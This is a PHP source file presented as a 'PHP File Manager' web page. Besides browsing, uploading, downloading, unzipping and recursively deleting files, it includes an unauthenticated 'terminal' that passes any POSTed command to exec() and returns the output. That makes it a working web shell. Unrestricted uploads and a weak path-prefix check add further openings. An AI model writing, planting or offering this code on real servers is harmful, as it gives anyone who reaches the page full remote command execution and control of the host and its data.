<?php
// Base directory
$base_dir = __DIR__;

// Get the current directory
$current_dir = isset($_GET['path']) ? realpath($base_dir . '/' . $_GET['path']) : $base_dir;

// Validate the current directory
if (strpos($current_dir, $base_dir) !== 0) {
    $current_dir = $base_dir;
}

// Handle file upload
if (isset($_FILES['file'])) {
    $upload_file = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "<div class='alert success'>File uploaded successfully: " . htmlspecialchars($_FILES['file']['name']) . "</div>";
    } else {
        echo "<div class='alert error'>Failed to upload file.</div>";
    }
}

// Handle file delete
if (isset($_GET['delete'])) {
    $delete_path = realpath($current_dir . '/' . $_GET['delete']);
    if (strpos($delete_path, $base_dir) === 0) {
        if (is_dir($delete_path)) {
            rmdir_recursive($delete_path);
        } else {
            unlink($delete_path);
        }
    }
    header("Location: ?path=" . urlencode(str_replace($base_dir, '', $current_dir)));
    exit;
}

// Recursive delete for folders
function rmdir_recursive($dir) {
    foreach (scandir($dir) as $file) {
        if ($file !== '.' && $file !== '..') {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                rmdir_recursive($path);
            } else {
                unlink($path);
            }
        }
    }
    rmdir($dir);
}

// Handle unzip
if (isset($_GET['unzip'])) {
    $zip_path = realpath($current_dir . '/' . $_GET['unzip']);
    if (strpos($zip_path, $base_dir) === 0 && pathinfo($zip_path, PATHINFO_EXTENSION) === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($zip_path) === true) {
            $zip->extractTo($current_dir);
            $zip->close();
        }
    }
    header("Location: ?path=" . urlencode(str_replace($base_dir, '', $current_dir)));
    exit;
}

// Handle file download
if (isset($_GET['download'])) {
    $download_path = realpath($current_dir . '/' . $_GET['download']);
    if (strpos($download_path, $base_dir) === 0 && is_file($download_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($download_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($download_path));
        readfile($download_path);
        exit;
    } else {
        echo "<div class='alert error'>File not found or invalid path.</div>";
    }
}

// Command execution (via AJAX)
if (isset($_POST['command'])) {
    chdir($current_dir); // Change to the current directory
    $command = $_POST['command'];
    $output = [];
    $status = 0;
    exec($command . ' 2>&1', $output, $status); // Capture both stdout and stderr
    echo nl2br(htmlspecialchars(implode("\n", $output))); // Send formatted output
    exit;
}

// List files
$files = scandir($current_dir);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; background-color: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        h2 { text-align: center; }
        ul { list-style: none; padding: 0; }
        li { margin: 5px 0; padding: 10px; background-color: #f9f9f9; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; }
        li a { text-decoration: none; color: #007bff; }
        li a:hover { text-decoration: underline; }
        .actions a { margin-left: 10px; color: red; text-decoration: none; }
        .actions a:hover { color: darkred; }
        form { text-align: center; margin-bottom: 20px; }
        input[type="file"] { margin-right: 10px; }
        .button { display: block; margin: 20px auto; padding: 10px 20px; background: #007bff; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
        .button:hover { background: #0056b3; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(2px); justify-content: center; align-items: center; }
        .modal-content { background: #121212; padding: 40px; border-radius: 8px; max-width: 600px; width: 90%; color: #33ff33; font-family: 'Courier New', monospace; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); border: 1px solid #33ff33; }
        .modal-content .close { color: #33ff33; font-size: 24px; cursor: pointer; position: absolute; top: 10px; right: 15px; }
        #commandInput { background: black; color: #33ff33; font-family: 'Courier New', monospace; width: 96%; padding: 10px; border: 1px solid #33ff33; border-radius: 5px; outline: none; margin-top: 15px; } 
        #commandInput::placeholder { color: #1aff1a; } .command-output { max-height: 300px; overflow-y: auto; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #33ff33; margin-bottom: 15px; }
        .close { float: right; font-size: 24px; cursor: pointer; }
        .command-output { margin-top: 10px; padding: 40px; background: black; border-radius: 5px; color: #33ff33; white-space: pre-wrap; font-family: 'Courier New', monospace; overflow-y: auto; max-height: 300px; }
        input[type="text"] { padding: 10px; width: 100%; margin-bottom: 10px; background: #222; color: white; border: 1px solid #333; font-family: 'Courier New', monospace; font-size: 16px; }
    </style>
</head>
<body>
<div class="container">
    <h2>PHP File Manager</h2>
    <p><strong>Current Directory:</strong> <?php echo htmlspecialchars($current_dir); ?></p>

    <!-- Upload Form -->
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>

    <!-- Show Command Popup -->
    <button class="button" onclick="showModal()">Open Terminal</button>

    <ul>
        <?php foreach ($files as $file): ?>
            <?php if ($file !== '.' && $file !== '..'): ?>
                <li>
                    <?php if (is_dir($current_dir . '/' . $file)): ?>
                        <a href="?path=<?php echo urlencode(str_replace($base_dir, '', $current_dir . '/' . $file)); ?>">
                            📂 <?php echo htmlspecialchars($file); ?>
                        </a>
                    <?php else: ?>
                        <a href="?download=<?php echo urlencode($file); ?>">
                            📄 <?php echo htmlspecialchars($file); ?>
                        </a>
                    <?php endif; ?>
                    <span class="actions">
                        <a href="?delete=<?php echo urlencode($file); ?>" title="Delete">🗑️</a>
                        <?php if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'): ?>
                            <a href="?unzip=<?php echo urlencode($file); ?>" title="Unzip">📦</a>
                        <?php endif; ?>
                    </span>
                </li>
            <?php endif; ?>
        <?php endforeach; ?>
    </ul>
</div>

<!-- Modal -->
<div class="modal" id="commandModal">
    <div class="modal-content">
        <span class="close" onclick="hideModal()">&times;</span>
        <div class="command-output" id="terminalOutput"></div>
        <input type="text" id="commandInput" placeholder="Enter command...">
    </div>
</div>

<script>
    function showModal() {
        document.getElementById('commandModal').style.display = 'flex';
    }

    function hideModal() {
        document.getElementById('commandModal').style.display = 'none';
    }

    document.getElementById('commandInput').addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            const command = event.target.value;
            const terminalOutput = document.getElementById('terminalOutput');
            terminalOutput.innerHTML += `<div>$ ${command}</div>`;
            event.target.value = '';

            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `command=${encodeURIComponent(command)}`
            })
            .then(response => response.text())
            .then(output => {
                terminalOutput.innerHTML += `<pre>${output}</pre>`;
                terminalOutput.scrollTop = terminalOutput.scrollHeight; // Auto-scroll to bottom
            });
        }
    });
</script>
</body>
</html>
